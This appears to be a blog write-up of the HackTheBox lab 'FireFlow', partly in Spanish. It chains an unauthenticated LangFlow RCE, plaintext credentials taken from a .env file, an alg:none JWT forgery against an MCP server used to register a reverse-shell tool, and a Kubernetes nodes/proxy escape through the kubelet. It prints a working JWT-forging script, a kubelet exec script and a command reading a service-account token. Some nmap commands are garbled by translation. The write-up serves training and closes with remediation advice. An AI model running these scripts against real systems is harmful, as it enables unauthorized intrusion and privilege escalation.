![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*x7cFAOPNJPvbfUPpTu3ZgA.png)

## Resumen

**Máquina:** FireFlow (HackTheBox) — dificultad Media

Este artículo cubre el compromiso completo de FireFlow, desde el reconocimiento inicial hasta la raíz, encadenando un RCE no autenticado en una instancia de LangFlow auto-alojada, un JWT `alg:none` Falsificación contra un servidor MCP (Model Context Protocol) mal configurado, y un escape de cápsula privilegiada de Kubernetes para obtener root en el host subyacente.

## 1\. Reconocimiento

Empecé con un escaneo completo del puerto TCP para identificar cada puerto abierto y versión de servicio.

```cs
nmap - p ---open -sS --min-rate 50005000 -vvv -n -Pn -oG Puertos -oN Puertos 10.129.73.28
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uN7Kn7RDelTNAs65sPjIUA.png)

Con los puertos abiertos identificados, ejecuté un servicio/exploración de versión dirigida contra ellos:

```cs
nmap -p22.443 -sCV 10.129.73.28 - en Vports
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tuS7uEDUSFC5UmonIkRdCg.png)

Only two ports were open: **22 (SSH)** and **443 (HTTPS)**.

## 2\. Enumeration

Since only SSH and HTTPS were exposed, I focused on the web service. Browsing to the HTTPS endpoint revealed a subdomain hosting a **LangFlow** instance — an open-source visual builder for LLM-powered applications.

The LangFlow version was disclosed at the bottom of the main page:

That version is affected by **CVE-2026–33017**, a critical **unauthenticated remote code execution (RCE)** vulnerability in LangFlow. The flaw allows an unauthenticated attacker to execute arbitrary Python code on the server, because LangFlow’s flow-execution API does not enforce authentication on the endpoint that evaluates custom component code.

## 3\. Exploitation

I used a public proof-of-concept ([PoC](https://github.com/EQSTLab/CVE-2026-33017)) for CVE-2026–33017 and adapted it to target an HTTPS endpoint — the original PoC assumed plain HTTP, so I added TLS support (`verify=False`) inside the `send_payload()` function to point it at the HTTPS subdomain.

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-Ym8nvDk1Nid048J_F9xXA.png)

Running the modified script confirmed code execution on the target:

**Root cause:** LangFlow exposes an API endpoint that lets a client submit and execute a custom “flow” component without any authentication check. Since these components can contain arbitrary Python, an unauthenticated request is enough to achieve full RCE.

Enumerating the filesystem from my RCE foothold, I found a `.env` file containing credentials for the user `<username>`:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PCTUuWMeZjAi40AypxN5rA.png)

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bNt27noR_zlFpo3Ag8UOtg.png)

I used these credentials to authenticate over SSH and obtained a shell as “nightfall”:

![](https://miro.medium.com/v2/resize:fit:1336/format:webp/1*8N_GSDgdejlnlEO9Z6om1Q.png)

While looking for a privilege escalation path, I found a `config.json` file inside a `.mcp` directory in the user's home folder:

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*HEY96bh5Xe_ogPjS1Xdovw.png)

The directory name (`.mcp`) and the structure of the configuration file indicated that the host was also running an **MCP (Model Context Protocol) server** — a service that exposes "tools" (callable functions) to AI agents over an HTTP API.

## Get PELURED’s stories in your inbox

Join Medium for free to get updates from this writer.

Querying the service with `curl` returned its version banner and additional endpoint details:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8_pwIq5MuTEV1FnKbsVwHg.png)

Sending a `POST` request to the `/auth` endpoint returned a valid access token:

Decoding the token showed it was a standard JWT:

The MCP configuration file revealed that at least one endpoint required the `admin` role to be reachable — but the token I had obtained only carried a low-privileged role.

Because the server’s JWT verification logic did not explicitly reject the `none` algorithm, I crafted an unsigned token asserting the `admin` role:

```cs
import base64, json
def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
token = f"{header}.{payload}."
print(token)
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sYkpOfGDaMCbyga7Ml3GNQ.png)

**Root cause:** The JWT specification allows `alg: none` as a valid (unsigned) algorithm for cases where integrity is verified through other means. Many JWT libraries will happily parse and trust an unsigned token if the server does not explicitly whitelist the accepted algorithms. Here, the MCP server accepted the forged token as authentic and granted it `admin` privileges, meaning authentication was effectively bypassable simply by asserting the desired role in the payload.

With this forged admin token, I registered a malicious MCP “tool” whose implementation executed an arbitrary system command (a reverse shell) whenever invoked:

I set up a listener on my attacking machine and triggered the reverse shell by invoking the malicious tool through the MCP API:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oLl4XPnKWN1oZd_ftuXVxA.png)

This returned a shell as the `mcp` user:

## 4\. Privilege Escalation

Enumerating the new environment as `mcp`, several indicators (mount points, environment variables, service account tokens) suggested I was running inside a **Kubernetes pod**. I confirmed this with:

```cs
env | grep KUBERNETES
```

To determine what the pod’s service account was authorized to do, I sent a `POST` request to the Kubernetes API's `SelfSubjectRulesReview` endpoint:

```cs
curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"  -H "Content-Type: application/json"  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```
![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ss5DFnMIhj_Qs7HC-PFq2A.png)

The response showed the service account held the `nodes/proxy` permission. This is a highly sensitive permission: it allows a client to send arbitrary requests to the **kubelet API** on any node in the cluster, including endpoints that can execute commands inside any pod running on that node — effectively enabling cluster-wide code execution from a single compromised service account.

I then searched the cluster for a **privileged pod** to pivot into:

I found a privileged pod configured with `hostPath` mounts of `/proc`, `/sys`, and `/` — meaning the entire host filesystem was mounted directly inside the pod. Combined with the `nodes/proxy` permission, this gave a direct path to host-level code execution.

Using the `nodes/proxy` permission, I wrote a script to execute commands inside the privileged pod via the kubelet API, which in turn let me interact with the mounted host filesystem:

```cs
#!/usr/bin/env python3

import asyncio
import ssl
import sys
import websockets

NODE = "10.129.80.198"
NAMESPACE = "monitoring"
POD = "prometheus-prometheus-node-exporter-nmntq"
CONTAINER = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()

async def run_command(command, output_file=None):
    query = "&".join(f"command={word}" for word in command.split())
    url = f"wss://{NODE}:10250/exec/{NAMESPACE}/{POD}/{CONTAINER}?output=1&error=1&{query}"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    output = []
    try:
        async with websockets.connect(
            url,
            ssl=ctx,
            additional_headers={"Authorization": f"Bearer {TOKEN}"},
            subprotocols=["v4.channel.k8s.io"],
        ) as ws:
            print(f"[+] Ejecutando: {command}")
            async for msg in ws:
                decoded = msg[1:].decode(errors="replace")
                output.append(decoded)
                if not output_file:
                    sys.stdout.write(decoded)
                    sys.stdout.flush()

        if output_file:
            with open(output_file, 'w') as f:
                f.write(''.join(output))
            print(f"[+] Output guardado en: {output_file}")

        return ''.join(output)

    except Exception as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == "__main__":
    # Por defecto ejecuta cat /root/root/root.txt
    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /root/root/root.txt"
    
    # Si se pasa un segundo argumento, lo usa como archivo de salida
    output = sys.argv[2] if len(sys.argv) > 2 else None
    
    asyncio.run(run_command(cmd, output))
```
```cs
python3 script.py
```
![](https://miro.medium.com/v2/resize:fit:1302/format:webp/1*B_bzejRM-PCAK-LXA-_j4Q.png)

**Root cause:** The service account bound to the `mcp` pod was over-privileged, holding `nodes/proxy` rights it did not need. Combined with an unrelated privileged pod that mounted the host's root filesystem, this allowed full container breakout and host compromise — a classic case of excessive RBAC permissions plus insecure pod security context compounding into a critical escalation path.

## Remediation

- **LangFlow RCE:** Upgrade to a patched LangFlow release and ensure the flow-execution API requires authentication; do not expose LangFlow admin interfaces on public-facing subdomains.
- **Credential hygiene:** Do not store plaintext credentials in `.env` files reachable from a web application's execution context; use a secrets manager and restrict file permissions.
- **JWT** `**alg:none**`**:** Explicitly whitelist accepted signing algorithms (e.g., `RS256`, `HS256`) in the JWT verification library and reject any token asserting `alg: none`.
- **MCP tool registration:** Restrict who can register new tools; treat tool registration as a privileged, auditable action, and sandbox tool execution.
- **Kubernetes RBAC:** Apply least privilege to service accounts — `nodes/proxy` should never be granted to workload pods unless strictly required. Avoid `hostPath` mounts of `/`, `/proc`, or `/sys` in any pod; use Pod Security Admission/Standards to block privileged pods by default.
